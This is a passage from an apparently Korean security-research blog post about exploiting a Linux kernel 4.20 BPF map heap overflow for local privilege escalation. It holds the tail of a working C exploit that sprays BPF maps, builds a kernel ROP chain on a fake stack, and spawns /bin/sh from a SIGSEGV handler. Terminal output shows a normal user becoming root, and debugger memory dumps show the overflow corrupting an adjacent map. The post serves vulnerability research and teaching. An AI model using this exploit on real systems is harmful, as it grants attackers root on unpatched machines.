class="built_in">puts</span>(<span class="string">"rop_payload_initialized"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> r[<span class="number">1</span>] = &#123;<span class="number">0xffffffffffffffff</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defragmentation</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">defragment</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(name, <span class="number">100</span>, <span class="string">"xxx%d"</span>, i);</span><br><span class="line">        fp=fopen(name,<span class="string">"w"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"SIGSEGV found"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"get shell again"</span>);</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV,get_shell_again);</span><br><span class="line">    <span class="comment">//get_shell();</span></span><br><span class="line">    syscall(__NR_mmap, <span class="number">0x20000000</span>, <span class="number">0x1000000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c0</span> = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c4</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c8</span> = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011cc</span> = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d0</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d4</span> = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dc</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dd</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011de</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011df</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e0</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e1</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e2</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e3</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e4</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e5</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e6</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e7</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e9</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011ea</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011eb</span> = <span class="number">0</span>;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"user_cs:%llx   user_ss: %llx\n"</span>,user_cs,user_ss);</span><br><span class="line">    prepare_krop();</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">        r[<span class="number">0</span>] = res;</span><br><span class="line">    spray();</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)<span class="number">0x200000c0</span> = r[<span class="number">0</span>];</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000c8</span> = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d0</span> = <span class="number">0x20000140</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d8</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)<span class="number">0x20000140</span>;</span><br><span class="line">    ptr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    ptr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line">    ptr[<span class="number">4</span>]=<span class="number">5</span>;</span><br><span class="line">    ptr[<span class="number">5</span>]=<span class="number">6</span>;</span><br><span class="line">    ptr[<span class="number">6</span>]=<span class="number">0xa000000000</span>;</span><br><span class="line">    ptr[<span class="number">7</span>]=<span class="number">8</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, <span class="number">0x200000c0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//pause();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./exp</span><br><span class="line">user_cs:33   user_ss: 2b</span><br><span class="line">rop_payload_initialized</span><br><span class="line">SIGSEGV found</span><br><span class="line">get shell again</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h3 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h3><p>bpf 맵을 할당하게 되는 <code>bpf_map_area_alloc()</code> 함수에 break를 걸고 리턴 주소를 확인한 뒤, heap overflow 전 후의 해당 주소의 데이터를 비교해본 결과입니다.</p>
<p>첫 번째(fd 3) bpf 맵의 주소가 <code>0xffff88807f510300</code> 인 상황입니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0xffff88807f510300</span><br><span class="line">0xffff88807f510300:	0xffffffff82029ba0	0x0000000000000000     // fd = 3</span><br><span class="line">0xffff88807f510310:	0xffff888079b06f00	0x0000000000000017</span><br><span class="line">0xffff88807f510320:	0xffffffff00000040	0x0000000100000000</span><br><span class="line">0xffff88807f510330:	0xffffffff00000010	0x0000000000000000</span><br><span class="line">0xffff88807f510340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510350:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510380:	0xffff88807fad8b00	0x0000000100000001</span><br><span class="line">0xffff88807f510390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510400:	0xffffffff82029ba0	0x0000000000000000     // fd = 7</span><br><span class="line">0xffff88807f510410:	0xffff888079b06f68	0x0000000000000017</span><br><span class="line">0xffff88807f510420:	0xffffffff00000040	0x0000000100000000</span><br><span class="line">0xffff88807f510430:	0xffffffff00000014	0x0000000000000000</span><br><span class="line">0xffff88807f510440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>heap overflow가 일어나기 전의 데이터 상황입니다. 첫 번째(fd 3) 맵과 인접하게 할당된 fd 7 맵의 첫 번째 멤버가 <code>0xffffffff82029ba0</code> 인 것을 확인할 수 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0xffff88807f510300</span><br><span class="line">0xffff88807f510300:	0xffff88807f510500	0x0000000000000000     // fd = 3</span><br><span class="line">0xffff88807f510310:	0x0000000000000000	0x0000000000000017</span><br><span class="line">0xffff88807f510320:	0xffffffff00000040	0x0000000100000000</span><br><span class="line">0xffff88807f510330:	0xffffffff00000000	0x0000000000000000</span><br><span class="line">0xffff88807f510340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510350:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510380:	0xffff88807fad8b00	0x0000000000000000</span><br><span class="line">0xffff88807f510390:	0x0000000000000000	0xffff88807f510398</span><br><span class="line">0xffff88807f5103a0:	0xffff88807f510398	0xffffffff8119ac50</span><br><span class="line">0xffff88807f5103b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f5103d0:	0x0000000000000001	0x0000000000000002</span><br><span class="line">0xffff88807f5103e0:	0x0000000000000003	0x0000000000000004</span><br><span class="line">0xffff88807f5103f0:	0x0000000000000005	0x0000000000000006</span><br><span class="line">0xffff88807f510400:	0x000000a000000000	0x0000000000000008     // fd = 7</span><br><span class="line">0xffff88807f510410:	0xffff888079b06f68	0x0000000000000017</span><br><span class="line">0xffff88807f510420:	0xffffffff00000040	0x0000000100000000</span><br><span class="line">0xffff88807f510430:	0xffffffff00000014	0x0000000000000000</span><br><span class="line">0xffff88807f510440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88807f510470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>heap overflow가 일어난 후의 데이터 상황입니다. fd 7 맵의 첫 번째 멤버가 <code>fakestack</code> 주소인 <code>0x000000a000000000</code> 으로 덮인 것을 확인할 수 있습니다.</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><a href="https://www.mail-archive.com/netdev@vger.kernel.org/msg256054.html" target="_blank" rel="noopener">https://www.mail-archive.com/netdev@vger.kernel.org/msg256054.html</a></li>
<li><a href="https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c" target="_blank" rel="noopener">https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c</a></li>
<li><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/" target="_blank" rel="noopener">http://p4nda.top/2019/01/02/kernel-bpf-overflow/</a></li>
<li><a href="https://github.com/wariua/manpages-ko/wiki/bpf(2)/" target="_blank" rel="noopener">https://github.com/wariua/manpages-ko/wiki/bpf(2)/</a></li>
<li><a href="https://wariua.github.io/facility/extended-bpf.html" target="_blank" rel="noopener">https://wariua.github.io/facility/extended-bpf.html</a></li>
<li><a href="https://ssup2.github.io/theory_analysis/Linux_BPF/" target="_blank" rel="noopener">https://ssup2.github.io/theory_analysis/Linux_BPF/</a></li>
<li><a href="http://jake.dothome.co.kr/kmalloc/" target="_blank" rel="noopener">http://jake.dothome.co.kr/kmalloc/</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
      <blockquote class="mdui-m-t-5">
        
      </blockquote>
      
    </div>
    
  </article>
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>


  <nav id="paginator">
    
      <a rel="prev" class="extend prev" href="/2019/12/03/Rev/ㄴ Research/How_to_debug_Windows_Kernel_Driver/">
        <button aria-label="prev" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_back</i></button>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;다음 글
      </a>
    
    <div class="spacer"></div>
    
      <a rel="next" class="extend next" href="/2019/11/12/Pwn/ㄴ Research/CVE_2016_0728/">
        이전 글&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
      </a>
    
  </nav>




</main>
  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
  <div class="mdui-p-y-0 mdui-text-center">
    
    
    
    
    
    
    
    
    
    
    
    
  </div>
  <div class="mdui-p-y-1 mdui-text-center">
    Copyright &copy; 2019 - 2019 Defenit<br>
    
  </div>
</footer>

  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
  
  <script src="/js/mdui.js"></script>
<script src="/js/script.js"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<!--<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML'></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>